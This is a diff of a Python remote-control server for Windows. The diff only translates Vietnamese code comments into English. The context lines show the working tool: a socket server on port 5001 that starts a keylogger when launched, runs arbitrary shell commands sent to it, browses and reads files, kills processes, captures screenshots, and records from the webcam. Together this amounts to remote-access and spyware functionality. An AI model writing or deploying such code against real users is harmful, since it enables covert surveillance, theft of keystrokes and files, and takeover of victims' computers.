@@ -11,13 +11,13 @@ from PIL import ImageGrab
 import io
 import numpy as np
 from pynput import keyboard
-import psutil # Đảm bảo đã pip install psutil
-import ctypes # Dùng để tắt màn hình console (nếu muốn)
+import psutil 
+import ctypes 
 
 HOST = "0.0.0.0"
 PORT = 5001
 
-# --- BIẾN TOÀN CỤC ---
+# --- GLOBAL VARIABLES ---
 global_cap = None
 global_frame = None
 camera_lock = threading.Lock()
@@ -50,7 +50,7 @@ def start_keylogger():
 start_keylogger()
 
 # ==========================================
-# HÀM HỆ THỐNG & FILE (WINDOWS)
+# SYSTEM & FILE OPERATIONS (WINDOWS)
 # ==========================================
 def get_file_bytes(path):
     if os.path.exists(path) and os.path.isfile(path):
@@ -59,10 +59,10 @@ def get_file_bytes(path):
 
 def list_directory(path):
     try:
-        # Xử lý đường dẫn Windows
+        # Handle current path
         if not path or path == ".": path = os.getcwd()
         
-        # Nếu path là root (ví dụ chỉ gửi list_dir), có thể trả về danh sách ổ đĩa
+        # If path is root, list available drives
         if path == "/": 
             drives = [f"{d}:\\" for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f"{d}:")]
             items = [{"name": d, "type": "folder", "size": 0, "path": d} for d in drives]
@@ -90,7 +90,7 @@ def list_directory(path):
 
 def run_shell(cmd):
     try:
-        # Windows dùng encoding 'cp1252' hoặc 'utf-8' tuỳ máy, set shell=True
+        # Windows encoding might be cp1252 or utf-8
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
         try:
             return output.decode('utf-8')
@@ -102,11 +102,10 @@ def run_shell(cmd):
     except Exception as e: return str(e)
 
 # ==========================================
-# QUẢN LÝ APP (WINDOWS)
+# APP MANAGEMENT (WINDOWS)
 # ==========================================
 def scan_installed_apps():
-    # Windows không có thư mục App chung như Mac. 
-    # Scan Start Menu để lấy shortcut
+    # Scan Start Menu for shortcuts (.lnk)
     found_apps = {}
     paths = [
         os.path.join(os.environ["ProgramData"], r"Microsoft\Windows\Start Menu\Programs"),
@@ -122,7 +121,7 @@ def scan_installed_apps():
                     full_path = os.path.join(root, file)
                     found_apps[name.lower()] = full_path
     
-    # Thêm một số app cơ bản mặc định
+    # Add default system apps
     found_apps["notepad"] = "notepad.exe"
     found_apps["calculator"] = "calc.exe"
     found_apps["chrome"] = "chrome.exe"
@@ -132,7 +131,7 @@ def scan_installed_apps():
 APPS = scan_installed_apps()
 
 def is_app_running(name):
-    # Tìm trong danh sách process
+    # Check process list for app name
     name = name.lower()
     if name.endswith(".lnk"): name = name[:-4]
     if not name.endswith(".exe"): name += ".exe"
@@ -141,20 +140,19 @@ def is_app_running(name):
 
 def start_app(path_or_name):
     try:
-        os.startfile(path_or_name) # Lệnh mở file/app chuẩn trên Windows
+        os.startfile(path_or_name) 
         return f"[OK] Started {path_or_name}"
     except Exception as e:
         return f"[ERROR] {e}"
 
 def stop_app(name):
-    # Cần tên file exe (ví dụ: notepad.exe)
-    # Nếu đầu vào là tên shortcut, cố gắng đoán tên exe
+    # Requires executable name (e.g., notepad.exe)
     proc_name = os.path.basename(name)
     if proc_name.endswith(".lnk"): proc_name = proc_name[:-4]
     if not proc_name.endswith(".exe"): proc_name += ".exe"
 
     try:
-        # Dùng taskkill mạnh mẽ trên Windows
+        # Use taskkill for Windows
         subprocess.run(["taskkill", "/F", "/IM", proc_name], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         return f"[OK] Killed {proc_name}"
     except:
@@ -188,7 +186,7 @@ def get_sys_stats():
     return json.dumps({
         "cpu": psutil.cpu_percent(interval=None),
         "ram": psutil.virtual_memory().percent,
-        "disk": psutil.disk_usage('C:\\').percent # Mặc định lấy ổ C
+        "disk": psutil.disk_usage('C:\\').percent # Default to C: drive
     })
 
 def kill_process_id(pid):
@@ -203,7 +201,7 @@ def kill_process_id(pid):
 # ==========================================
 def camera_loop():
     global global_cap, global_frame
-    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) # CAP_DSHOW giúp mở cam nhanh hơn trên Windows
+    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) # CAP_DSHOW for faster initialization on Windows
     cap.set(3, 640); cap.set(4, 480)
     if not cap.isOpened(): return
     global_cap = cap
@@ -220,7 +218,7 @@ def capture_screen_bytes():
     try:
         img = ImageGrab.grab()
         b = io.BytesIO()
-        img.save(b, format='JPEG', quality=60) # Giảm chất lượng chút cho mượt
+        img.save(b, format='JPEG', quality=60) # Lower quality for performance
         return b.getvalue()
     except: return None
 
@@ -255,7 +253,7 @@ def record_webcam(seconds):
         with camera_lock:
             if global_frame is None: return None
             h, w, _ = global_frame.shape
-        # Windows dùng 'mp4v' thường ổn hơn 'avc1' nếu chưa cài codec
+        # 'mp4v' codec works well on Windows
         out = cv2.VideoWriter(filename, cv2.VideoWriter_fourcc(*'mp4v'), 20.0, (w, h))
         start = time.time()
         while (time.time() - start) < seconds:
@@ -290,14 +288,14 @@ def handle_client(conn, addr):
                  conn.sendall(res.encode())
              return
         elif command == "list_apps":
-            # Trên Windows, is_app_running hơi khó chính xác với shortcut, tạm trả về list tĩnh
+            # Running status check might be inaccurate on Windows due to shortcuts
             conn.sendall(json.dumps({k: {"name": k, "running": False} for k in APPS.keys()}).encode()); return
 
         # --- SYSTEM ---
         elif command == "sys_stats": conn.sendall(get_sys_stats().encode()); return
         elif command == "list_processes_json": conn.sendall(get_process_json().encode()); return
         elif command == "list_processes": 
-            # Giả lập output dạng text cho client cũ
+            # Simulate text output for legacy clients
             try:
                 out = subprocess.check_output("tasklist", shell=True).decode('cp1252', errors='ignore')
                 conn.sendall(out.encode('utf-8'))
@@ -352,7 +350,6 @@ def handle_client(conn, addr):
              except: r=""
              conn.sendall(r.encode()); return
         elif command == "keylog_web":
-             # Ghi phím từ web gửi về
              if is_keylogging:
                  key_char = parts[1] if len(parts)>1 else ""
                  if key_char == "[SPACE]": key_char = " "
